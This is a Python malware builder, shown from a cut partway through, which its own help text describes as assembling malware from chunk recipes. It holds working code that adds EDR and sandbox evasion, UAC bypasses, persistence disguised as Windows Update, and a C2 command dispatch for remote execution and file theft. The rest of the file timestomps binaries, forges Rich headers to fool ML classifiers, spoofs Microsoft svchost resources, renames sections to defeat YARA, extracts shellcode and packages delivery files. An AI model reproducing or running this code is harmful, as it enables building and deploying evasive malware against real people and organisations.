    "evasion/syscall_win32u": "    init_indirect_syscalls();",
    "evasion/unhook_debug_read": "    unhook_ntdll();",
    "evasion/unhook_knowndlls": "    unhook_ntdll();",
    "evasion/unhook_peruns_fart": "    unhook_ntdll();",
    "evasion/manual_syscall_stub": "    init_indirect_syscalls();",
    "evasion/stack_spoof_loudsunrun": "",
    "evasion/stack_spoof_synthetic": "",
    "evasion/stack_spoof_rop": "",
    "evasion/anti_sandbox_network": "    sandbox_check();",
    "evasion/ntmap_inject": "",
    "evasion/thread_hijack": "",
    "evasion/unhook_heavens_gate": "    unhook_ntdll();",
    "evasion/stack_spoof_gadget": "",
    "evasion/checksum_spoof": "",
    "evasion/syscall_trampoline": "    init_indirect_syscalls();",
    "evasion/debug_dir_strip": "",
    "evasion/code_cave": "",
    "evasion/dll_notif_callback": "",
    "evasion/section_merge": "",
    "evasion/guard_pages": "    guard_page_init();",
    "evasion/resource_spoof": "",
    "evasion/opaque_predicates": "",
    "evasion/seh_control_flow": "    seh_cf_init();",
    "evasion/instrumentation_callback": "",
    "evasion/cf_flatten": "",
    "evasion/net_domain_front": "",
    "evasion/atom_bombing": "",
    "evasion/propagate_inject": "",
    "evasion/etw_callback_inject": "",
    "evasion/net_doh": "",
    "evasion/veh_inject": "",
    "evasion/wnf_callback": "",
    "evasion/net_websocket": "",
    "evasion/net_cloud_c2": "",
    "evasion/net_ja3_spoof": "    ja3_spoof_init();",
    "evasion/net_traffic_shape": "    traffic_shape_init();",
    "evasion/process_doppelgang": "",
    "evasion/env_key_domain": "    if (!env_check_domain()) return 0;",
    "evasion/env_key_hostname": "    if (!env_check_hostname()) return 0;",
    "evasion/env_key_ip": "    if (!env_check_ip()) return 0;",
    "evasion/env_key_locale": "    if (!env_check_locale()) return 0;",
    "evasion/uac_fodhelper": "",
    "evasion/uac_eventvwr": "",
    "evasion/uac_cmstp": "",
    "evasion/uac_computerdefaults": "",
}

PERSIST_INIT_MAP = {
    "persist/registry_run": '    persist_registry_run("WindowsUpdate");',
    "persist/startup_folder": '    persist_startup_folder("svchost.exe");',
    "persist/scheduled_task": '    persist_scheduled_task("WindowsUpdateCheck");',
    "persist/com_hijack": "",
    "persist/wmi_subscription": "",
    "persist/ifeo_debugger": "",
    "persist/dll_search_order": "",
}

PROCESS_INIT_MAP = {
    "process/ppid_spoof": "",
    "process/ppid_spoof_dllhost": "",
    "process/ppid_spoof_runtimebroker": "",
    "process/ppid_spoof_sihost": "",
    "process/ppid_spoof_svchost": "",
    "process/ppid_spoof_taskhostw": "",
    "process/process_ghost": "    if (ghost_self() == 0) return 0;",
    "process/service_dll": "",
    "process/com_object": "",
}

API_RESOLVE_INIT_MAP = {
    "api_resolve/api_hash_djb2": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/api_hash_fnv1a": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/peb_walk": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/api_hash_crc32": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/api_hash_ror13": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/ldr_get_proc": "    if (!resolve_all_apis()) return 1;",
    "api_resolve/api_set_redirect": "    if (!resolve_all_apis()) return 1;",
}


def _rewrite_api_calls(source: str, api_resolve_chunk: str) -> str:
    """Rewrite direct Windows API calls to use resolved function pointers.

    After assembly, the api_resolve chunk defines struct.pXxx pointers but
    collector/exfil code still calls Xxx() directly. This pass rewrites
    those calls so the IAT no longer contains the resolved API names.

    Auto-detects the struct variable name from the chunk (api, RESOLVED_APIS,
    peb_api, etc.) so it works with any api_resolve implementation.
    """
    section_marker = f"/* ── {api_resolve_chunk} ── */"
    ar_start = source.find(section_marker)
    if ar_start == -1:
        return source

    next_section = source.find("/* ── ", ar_start + len(section_marker))
    if next_section == -1:
        ar_end = len(source)
    else:
        ar_end = next_section

    ar_section = source[ar_start:ar_end]

    api_names = []
    for m in re.finditer(r'typedef\s+\S+\s+\(WINAPI\s+\*fn_(\w+)\)', ar_section):
        api_names.append(m.group(1))

    if not api_names:
        return source

    struct_name = "api"
    m = re.search(r'\}\s+(\w+)\s*=\s*\{0\};', ar_section)
    if m:
        struct_name = m.group(1)

    before = source[:ar_start]
    after = source[ar_end:]

    for api_name in api_names:
        pattern = re.compile(r'(?<![.\w])' + re.escape(api_name) + r'\s*\(')
        repl = f'{struct_name}.p{api_name}('
        before = pattern.sub(repl, before)
        after = pattern.sub(repl, after)

    return before + source[ar_start:ar_end] + after


CMD_ID_MAP = {
    "commands/cmd_sysinfo": 0x02,
    "commands/cmd_sysinfo_lolbin": 0x02,
    "commands/cmd_processes": 0x03,
    "commands/cmd_processes_lolbin": 0x03,
    "commands/cmd_filelist": 0x04,
    "commands/cmd_fileread": 0x05,
    "commands/cmd_filewrite": 0x06,
    "commands/cmd_screenshot": 0x07,
    "commands/cmd_registry": 0x08,
    "commands/cmd_netinfo": 0x09,
    "commands/cmd_netinfo_lolbin": 0x09,
    "commands/cmd_exec": 0x0A,
    "commands/cmd_exec_powershell": 0x0B,
}


def build_command_dispatch(commands: list[str]) -> str:
    cases = []
    seen_ids = set()
    for cmd_ref in commands:
        cmd_id = CMD_ID_MAP.get(cmd_ref)
        if cmd_id is None or cmd_id in seen_ids:
            continue
        seen_ids.add(cmd_id)
        fn_name = cmd_ref.split("/")[-1]
        cases.append(f"                case 0x{cmd_id:02X}: rc = {fn_name}(cmd_buf, hdr.payload_len, out_buf, &out_len); break;")
    return "\n".join(cases)


_HIGH_RISK_EVASION = {
    "evasion/anti_debug": "IsDebuggerPresent/CheckRemoteDebuggerPresent are known malware indicators — increases EDR detection",
    "evasion/anti_sandbox": "Cursor/process/uptime checks are sandbox-evasion signatures — EDRs flag these; also blocks SSH testing",
    "evasion/anti_vm": "CPUID/registry VM checks are EDR red flags — also kills payload in test VMs (QEMU/KVM)",
}
_MEDIUM_RISK_EVASION = {
    "evasion/triggered_exec": "Waits for mouse movement — hangs indefinitely under SSH/automated deployment",
    "evasion/etw_patch": "Patching EtwEventWrite is a known technique — some EDRs detect the patch itself",
    "evasion/unhook_ntdll": "Remapping ntdll triggers file I/O to system32 — some EDRs monitor this",
    "evasion/amsi_hwbp": "Hardware breakpoints on AMSI are monitored by advanced EDRs",
    "evasion/hw_bp_etw": "Hardware breakpoints on ETW are monitored by advanced EDRs",
    "evasion/process_masquerade": "PEB overwrite detected by some EDRs via cross-reference checks",
    "evasion/deferred_exec": "Random startup delay (10-60s default, configurable via DEFERRED_BASE_MS/DEFERRED_RANGE_MS vars)",
}


def _warn_risky_evasion(evasion_list: list[str], recipe_name: str = "") -> None:
    """Print warnings for evasion chunks known to increase detection or break testing."""
    for e in evasion_list:
        if e in _HIGH_RISK_EVASION:
            print(f"WARNING [{recipe_name or 'recipe'}]: {e} — risk:high — {_HIGH_RISK_EVASION[e]}", file=sys.stderr)
        elif e in _MEDIUM_RISK_EVASION:
            print(f"WARNING [{recipe_name or 'recipe'}]: {e} — risk:medium — {_MEDIUM_RISK_EVASION[e]}", file=sys.stderr)


def assemble(recipe_path: str, extra_vars: dict | None = None,
             randomize: bool = False, seed: int | None = None) -> str:
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    _warn_risky_evasion(recipe.get("evasion", []), recipe.get("name", ""))

    fmt = recipe.get("format", "c")
    if fmt == "jscript":
        return assemble_jscript(recipe_path, extra_vars, randomize=randomize, seed=seed)
    if fmt == "vbscript":
        return assemble_vbscript(recipe_path, extra_vars, randomize=randomize, seed=seed)
    if fmt == "batch":
        return assemble_script(recipe_path, fmt, extra_vars, randomize=randomize, seed=seed)

    rng = _random.Random(seed) if seed is not None else _random.Random()
    variant_lookup = _load_variant_lookup() if randomize else {}

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    if recipe.get("api_resolve"):
        all_chunks.append(recipe["api_resolve"])
    all_chunks.extend(recipe.get("evasion", []))
    if recipe.get("process"):
        all_chunks.append(recipe["process"])
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    if recipe.get("c2"):
        all_chunks.append(recipe["c2"])
    all_chunks.extend(recipe.get("commands", []))
    if recipe.get("exfil"):
        all_chunks.append(recipe["exfil"])
    if recipe.get("persist"):
        all_chunks.append(recipe["persist"])
    all_chunks.append(recipe["arch"])

    substitutions = {}
    if randomize and variant_lookup:
        all_chunks, substitutions = _randomize_chunks(all_chunks, variant_lookup, rng)
        # Also randomize the resource profile seed
        if recipe.get("resources"):
            extra_vars = extra_vars or {}
            extra_vars.setdefault("_profile_seed", rng.randint(0, 2**31))
        if substitutions:
            print(f"Variant substitutions: {substitutions}", file=sys.stderr)

    resolved = []
    resolved_set = set()

    def _resolve_deps(chunk_ref):
        if chunk_ref in resolved_set:
            return
        path = resolve_chunk_path(chunk_ref)
        meta = parse_chunk_metadata(path)
        for dep in meta.get("depends", []):
            dep = dep.strip()
            if dep and dep not in resolved_set and "*" not in dep:
                _resolve_deps(dep)
        resolved_set.add(chunk_ref)
        resolved.append(chunk_ref)

    for chunk_ref in all_chunks:
        _resolve_deps(chunk_ref)

    seen_headers = set()
    all_headers = []
    all_libs = set()
    bodies = []

    for chunk_ref in resolved:
        path = resolve_chunk_path(chunk_ref)
        meta = parse_chunk_metadata(path)
        for h in meta["headers"]:
            if h not in seen_headers:
                seen_headers.add(h)
                all_headers.append(h)
        all_libs.update(meta["libs"])
        bodies.append(f"/* ── {chunk_ref} ── */\n")
        bodies.append(read_chunk_body(path))
        bodies.append("\n\n")

    base_headers = ["winsock2.h", "windows.h", "ws2tcpip.h", "stdio.h", "stdlib.h", "string.h", "stdarg.h"]
    final_headers = []
    for h in base_headers:
        if h not in seen_headers:
            seen_headers.add(h)
        final_headers.append(h)
    for h in all_headers:
        if h not in final_headers:
            final_headers.append(h)

    output_parts = []
    for h in final_headers:
        output_parts.append(f"#include <{h}>")
    output_parts.append("")

    output_parts.append("")

    evasion_list = recipe.get("evasion", [])
    if "evasion/sleep_encrypt" in evasion_list:
        output_parts.append("#define USE_OBF_SLEEP 1")

    _skip_define = {"C2_IP", "C2_PORT", "LDAP_USER", "LDAP_DOMAIN", "LDAP_PASS",
                     "ENV_KEY_DOMAIN", "ENV_KEY_HOSTNAME", "ENV_KEY_IP", "ENV_KEY_LOCALE"}
    for k, v in vars_dict.items():
        if k not in _skip_define:
            output_parts.append(f"#define {k} {v}")
    output_parts.append("")

    source = "\n".join(output_parts) + "\n" + "".join(bodies)

    collectors = recipe.get("collectors", [])
    source = source.replace("{{COLLECTOR_CALLS}}", build_collector_calls(collectors))
    source = source.replace("{{STAGED_COLLECTOR_CALLS}}", build_staged_calls(collectors))
    source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
    source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))

    commands = recipe.get("commands", [])
    resolved_commands = [substitutions.get(c, c) for c in commands]
    source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(resolved_commands))

    evasion_chunks = recipe.get("evasion", [])
    resolved_evasion = [substitutions.get(e, e) for e in evasion_chunks]
    evasion_init_lines = [EVASION_INIT_MAP[e] for e in resolved_evasion if e in EVASION_INIT_MAP and EVASION_INIT_MAP[e]]
    api_resolve_ref = recipe.get("api_resolve", "")
    if api_resolve_ref:
        init_call = API_RESOLVE_INIT_MAP.get(
            api_resolve_ref, "    if (!resolve_all_apis()) return 1;")
        evasion_init_lines.insert(0, init_call)
    process_ref = recipe.get("process", "")
    if process_ref and process_ref in PROCESS_INIT_MAP and PROCESS_INIT_MAP[process_ref]:
        evasion_init_lines.append(PROCESS_INIT_MAP[process_ref])
    persist_ref = recipe.get("persist")
    if persist_ref:
        prefs = [persist_ref] if isinstance(persist_ref, str) else persist_ref
        for p in prefs:
            resolved_p = substitutions.get(p, p)
            if resolved_p in PERSIST_INIT_MAP and PERSIST_INIT_MAP[resolved_p]:
                evasion_init_lines.append(PERSIST_INIT_MAP[resolved_p])
    source = source.replace("{{EVASION_INIT}}", "\n".join(evasion_init_lines) if evasion_init_lines else "")

    if recipe.get("api_resolve"):
        source = _rewrite_api_calls(source, recipe["api_resolve"])

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source


def stomp_pe_timestamp(exe_path: str) -> None:
    """Overwrite PE TimeDateStamp with a plausible old date to defeat 'recently compiled' heuristics."""
    import struct
    import random
    try:
        with open(exe_path, "r+b") as f:
            if f.read(2) != b"MZ":
                return
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off)
            if f.read(4) != b"PE\x00\x00":
                return
            ts_off = pe_off + 8
            old_ts = random.randint(1577836800, 1672531200)
            f.seek(ts_off)
            f.write(struct.pack("<I", old_ts))
    except (OSError, struct.error):
        pass


def randomize_section_names(exe_path: str) -> None:
    """Rename PE section names to random strings. Defeats YARA rules matching on .text/.data/.rdata."""
    import struct
    import random
    import string
    try:
        with open(exe_path, "r+b") as f:
            if f.read(2) != b"MZ":
                return
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off)
            if f.read(4) != b"PE\x00\x00":
                return
            # COFF header: Machine(2), NumberOfSections(2), ...
            f.seek(pe_off + 6)
            num_sections = struct.unpack("<H", f.read(2))[0]
            f.seek(pe_off + 20)
            opt_hdr_size = struct.unpack("<H", f.read(2))[0]
            section_table_off = pe_off + 24 + opt_hdr_size
            chars = string.ascii_letters + string.digits
            for i in range(num_sections):
                sec_off = section_table_off + i * 40
                f.seek(sec_off)
                old_name = f.read(8)
                # Generate random 4-6 char name with . prefix
                name_len = random.randint(3, 6)
                new_name = "." + "".join(random.choice(chars) for _ in range(name_len))
                new_name_bytes = new_name.encode("ascii").ljust(8, b"\x00")
                f.seek(sec_off)
                f.write(new_name_bytes)
    except (OSError, struct.error):
        pass


def build_resource(recipe_data: dict, vars_dict: dict, work_dir: str,
                   profile_seed: int | None = None) -> str | None:
    if not recipe_data.get("resources", False):
        return None

    rc_template = CHUNKS_DIR / "resources" / "default.rc"
    if not rc_template.exists():
        print("Resource template not found", file=sys.stderr)
        return None

    rng = _random.Random(profile_seed) if profile_seed is not None else _random.Random()
    profiles_path = CHUNKS_DIR / "resources" / "profiles.yaml"
    profile = {}
    if profiles_path.exists():
        with open(profiles_path) as f:
            pdata = yaml.safe_load(f)
        profiles = pdata.get("profiles", [])
        if profiles:
            profile = rng.choice(profiles)
            print(f"Resource profile: {profile.get('product', 'default')}", file=sys.stderr)

    rc_vars = {
        "RC_COMPANY": vars_dict.get("RC_COMPANY", profile.get("company", "Microsoft Corporation")),
        "RC_PRODUCT": vars_dict.get("RC_PRODUCT", profile.get("product", "Host Process")),
        "RC_DESCRIPTION": vars_dict.get("RC_DESCRIPTION", profile.get("description", "Host Process for Services")),
        "RC_FILENAME": vars_dict.get("RC_FILENAME", profile.get("filename", "svchost.exe")),
        "RC_VERSION": vars_dict.get("RC_VERSION", profile.get("version", "10.0")),
    }
    parts = rc_vars["RC_VERSION"].split(".")
    rc_vars["RC_VMAJOR"] = parts[0] if parts else "1"
    rc_vars["RC_VMINOR"] = parts[1] if len(parts) > 1 else "0"
    asm_name = re.sub(r"[^A-Za-z0-9]", "", rc_vars["RC_COMPANY"]) + "." + re.sub(r"[^A-Za-z0-9]", "", rc_vars["RC_PRODUCT"])
    rc_vars["RC_ASMNAME"] = asm_name

    with open(rc_template) as f:
        rc_content = f.read()

    body_lines = []
    for line in rc_content.split("\n"):
        if line.strip().startswith("//"):
            continue
        body_lines.append(line)
    rc_body = "\n".join(body_lines)

    for k, v in rc_vars.items():
        rc_body = rc_body.replace(f"{{{{{k}}}}}", str(v))

    rc_path = os.path.join(work_dir, "resource.rc")
    res_obj = os.path.join(work_dir, "resource.o")
    with open(rc_path, "w") as f:
        f.write(rc_body)

    try:
        result = subprocess.run(
            ["x86_64-w64-mingw32-windres", rc_path, "-o", res_obj],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            print(f"windres error:\n{result.stderr}", file=sys.stderr)
            return None
        return res_obj
    except FileNotFoundError:
        print("x86_64-w64-mingw32-windres not found", file=sys.stderr)
        return None


def inject_rich_header(exe_path: str) -> bool:
    """Inject a fake MSVC Rich header into a MinGW PE to fool ML classifiers.

    Moves the PE header forward within the existing header space (before the
    first section) to make room for the Rich header. No section data shifts,
    so RawPtrs and file layout stay valid.
    """
    import struct as _st

    try:
        with open(exe_path, "r+b") as f:
            if f.read(2) != b"MZ":
                return False
            f.seek(0x3C)
            pe_off = _st.unpack("<I", f.read(4))[0]
            f.seek(0)
            all_data = bytearray(f.read())

            dos_stub_end = 0x80
            tool_entries = [
                (0x00010000, 0x00000067),
                (0x01046E01, 0x00000001),
                (0x01046C01, 0x0000000E),
                (0x00FF6E01, 0x00000003),
                (0x01006C01, 0x00000008),
                (0x01046401, 0x00000001),
                (0x00E06E01, 0x00000002),
                (0x01046001, 0x00000001),
            ]

            rich_size = 16 + len(tool_entries) * 8 + 8
            while (dos_stub_end + rich_size) % 8 != 0:
                rich_size += 1

            new_pe_off = dos_stub_end + rich_size

            nsec = _st.unpack_from("<H", all_data, pe_off + 6)[0]
            soh_size = _st.unpack_from("<H", all_data, pe_off + 20)[0]
            sec_table_end = pe_off + 24 + soh_size + nsec * 40
            pe_block = all_data[pe_off:sec_table_end]

            first_raw = None
            for i in range(nsec):
                so = pe_off + 24 + soh_size + i * 40
                rp = _st.unpack_from("<I", all_data, so + 20)[0]
                if rp > 0 and (first_raw is None or rp < first_raw):
                    first_raw = rp

            if first_raw is None or new_pe_off + len(pe_block) > first_raw:
                return False

            checksum = new_pe_off
            for i in range(0, min(0x3C, dos_stub_end), 4):
                checksum ^= _st.unpack_from("<I", all_data, i)[0]
            for comp_id, count in tool_entries:
                checksum ^= (comp_id ^ count)
            checksum &= 0xFFFFFFFF

            rich = _st.pack("<I", 0x536E6144 ^ checksum)
            rich += _st.pack("<III", checksum, checksum, checksum)
            for comp_id, count in tool_entries:
                rich += _st.pack("<II", comp_id ^ checksum, count ^ checksum)
            rich += b"Rich" + _st.pack("<I", checksum)
            rich += b"\x00" * (rich_size - len(rich))

            all_data[pe_off:sec_table_end] = b"\x00" * (sec_table_end - pe_off)
            all_data[dos_stub_end:dos_stub_end + rich_size] = rich
            all_data[new_pe_off:new_pe_off + len(pe_block)] = pe_block
            _st.pack_into("<I", all_data, 0x3C, new_pe_off)

            f.seek(0)
            f.write(bytes(all_data))
            f.truncate()
            return True
    except (OSError, _st.error, ValueError):
        return False


ZIG_PATH = os.environ.get("ZIG_PATH", os.path.expanduser("~/local/bin/zig"))


def compile_zig(source_path: str, output_path: str, dll_def: str | None = None,
                resource_obj: str | None = None) -> bool:
    is_dll = dll_def is not None
    dll_exts = (".dll", ".cpl", ".xll")
    if is_dll and not any(output_path.endswith(ext) for ext in dll_exts):
        output_path = output_path.rsplit(".", 1)[0] + ".dll"
    cmd = [
        ZIG_PATH, "cc",
        "-target", "x86_64-windows-gnu",
        "-Wl,--subsystem,windows",
        f"-I{CHUNKS_DIR / 'process'}",
        f"-I{CHUNKS_DIR / 'evasion'}",
        f"-I{CHUNKS_DIR / 'api_resolve'}",
        f"-I{CHUNKS_DIR}",
    ]
    if is_dll:
        cmd.append("-shared")
    cmd.extend(["-o", output_path, source_path])
    if resource_obj:
        cmd.append(resource_obj)
    if is_dll and dll_def:
        cmd.append(dll_def)
    cmd.extend([
        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
        "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
        "-lwldap32", "-lnetapi32", "-lmpr",
        "-s",
    ])
    if is_dll:
        cmd.append("-Wl,--enable-stdcall-fixup")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            print(f"Zig compile error:\n{result.stderr}", file=sys.stderr)
            return False
        stomp_pe_timestamp(output_path)
        size = os.path.getsize(output_path)
        print(f"Compiled (zig): {output_path} ({size} bytes)")
        return True
    except FileNotFoundError:
        print(f"Zig not found at {ZIG_PATH}. Install: pip install --user --break-system-packages ziglang",
              file=sys.stderr)
        return False


def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None,
                  resource_obj: str | None = None) -> bool:
    is_dll = dll_def is not None
    dll_exts = (".dll", ".cpl", ".xll")
    if is_dll and not any(output_path.endswith(ext) for ext in dll_exts):
        output_path = output_path.rsplit(".", 1)[0] + ".dll"
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-mwindows",
        f"-I{CHUNKS_DIR / 'process'}",
        f"-I{CHUNKS_DIR / 'evasion'}",
        f"-I{CHUNKS_DIR / 'api_resolve'}",
        f"-I{CHUNKS_DIR}",
    ]
    if is_dll:
        cmd.append("-shared")
    cmd.extend(["-o", output_path, source_path])
    if resource_obj:
        cmd.append(resource_obj)
    if is_dll and dll_def:
        cmd.append(dll_def)
    cmd.extend([
        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
        "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
        "-lwldap32", "-lnetapi32", "-lmpr",
        "-static", "-s", "-Wl,--strip-all",
    ])
    if is_dll:
        cmd.append("-Wl,--enable-stdcall-fixup")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"Compile error:\n{result.stderr}", file=sys.stderr)
            return False
        stomp_pe_timestamp(output_path)
        if inject_rich_header(output_path):
            print(f"Injected Rich header: {output_path}")
        randomize_section_names(output_path)
        size = os.path.getsize(output_path)
        print(f"Compiled: {output_path} ({size} bytes)")
        return True
    except FileNotFoundError:
        print("x86_64-w64-mingw32-gcc not found", file=sys.stderr)
        return False


def extract_shellcode(exe_path: str, output_path: str) -> bool:
    """Extract .text section as raw shellcode from a compiled PE."""
    try:
        result = subprocess.run(
            ["x86_64-w64-mingw32-objcopy", "-O", "binary", "-j", ".text",
             exe_path, output_path],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode != 0:
            print(f"Shellcode extraction error:\n{result.stderr}", file=sys.stderr)
            return False
        size = os.path.getsize(output_path)
        print(f"Extracted shellcode: {output_path} ({size} bytes)")
        return True
    except FileNotFoundError:
        print("x86_64-w64-mingw32-objcopy not found", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(description="Assemble malware from chunk recipes")
    parser.add_argument("recipe", help="Path to recipe YAML file")
    parser.add_argument("-o", "--output", default="/tmp/assembled.c", help="Output .c file path")
    parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
    parser.add_argument("--compiler", choices=["mingw", "zig"], default="mingw",
                        help="Compiler toolchain (default: mingw)")
    parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")
    parser.add_argument("--randomize", action="store_true",
                        help="Randomly select chunk variants from variant groups")
    parser.add_argument("--seed", type=int, default=None,
                        help="Random seed for reproducible variant selection")
    parser.add_argument("--format", choices=["exe", "dll", "shellcode"], default="exe",
                        help="Output format (default: exe)")
    parser.add_argument("--delivery", nargs="+",
                        choices=["iso", "7z", "lnk", "sfx", "stager", "hta"],
                        help="Delivery packaging methods to generate")

    args = parser.parse_args()

    extra_vars = {}
    for v in args.var:
        if "=" in v:
            k, val = v.split("=", 1)
            extra_vars[k] = val

    try:
        source = assemble(args.recipe, extra_vars,
                          randomize=args.randomize, seed=args.seed)
    except FileNotFoundError as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)

    with open(args.recipe) as rf:
        recipe_data = yaml.safe_load(rf)
    fmt = recipe_data.get("format", "c")
    ext_map = {"jscript": ".js", "vbscript": ".vbs", "batch": ".bat", "c": ".c"}

    if fmt != "c" and args.output.endswith(".c"):
        args.output = args.output.replace(".c", ext_map.get(fmt, ".c"))

    with open(args.output, "w") as f:
        f.write(source)
    print(f"Assembled: {args.output} ({len(source)} chars)")

    if fmt in ("jscript", "vbscript", "batch"):
        if args.compile:
            print(f"{fmt} files don't need compilation — output is ready to run")
        return

    if args.compile:
        work_dir = os.path.dirname(os.path.abspath(args.output))
        profile_seed = args.seed if args.randomize else None
        res_obj = build_resource(recipe_data, recipe_data.get("vars", {}), work_dir,
                                 profile_seed=profile_seed)
        if res_obj:
            print(f"Built resource: {res_obj}")

        _compile = compile_zig if args.compiler == "zig" else compile_mingw
        arch = recipe_data.get("arch", "")
        dll_archs = {"arch/dll_sideload", "arch/dll_rundll", "arch/dll_cpl"}
        if arch in dll_archs:
            dll_def_name = recipe_data.get("def_file", "version.def")
            dll_def = str(CHUNKS_DIR / "arch" / dll_def_name)
            if arch == "arch/dll_cpl":
                out_path = args.output.replace(".c", ".cpl")
            else:
                out_path = args.output.replace(".c", ".dll")
            _compile(args.output, out_path, dll_def=dll_def, resource_obj=res_obj)
        else:
            exe_path = args.output.replace(".c", ".exe")
            _compile(args.output, exe_path, resource_obj=res_obj)

    if args.compile and getattr(args, "format", "exe") == "shellcode":
        sc_path = args.output.replace(".c", ".bin")
        extract_shellcode(exe_path, sc_path)

    # Delivery packaging
    if args.delivery and args.compile:
        output_dir = os.path.dirname(os.path.abspath(args.output))
        payload_path = None
        for ext in ('.exe', '.dll', '.cpl'):
            candidate = args.output.replace(".c", ext)
            if os.path.exists(candidate):
                payload_path = candidate
                break
        if not payload_path and fmt in ("jscript", "vbscript", "batch"):
            payload_path = args.output

        if payload_path:
            from templates.chunks.delivery import package as delivery_package
            results = delivery_package(payload_path, output_dir, methods=args.delivery)
            for method, result in results.items():
                if result.success:
                    print(f"Delivery [{method}]: {result.path} ({result.size:,} bytes)")
                else:
                    print(f"Delivery [{method}]: FAILED - {result.error}")


if __name__ == "__main__":
    main()
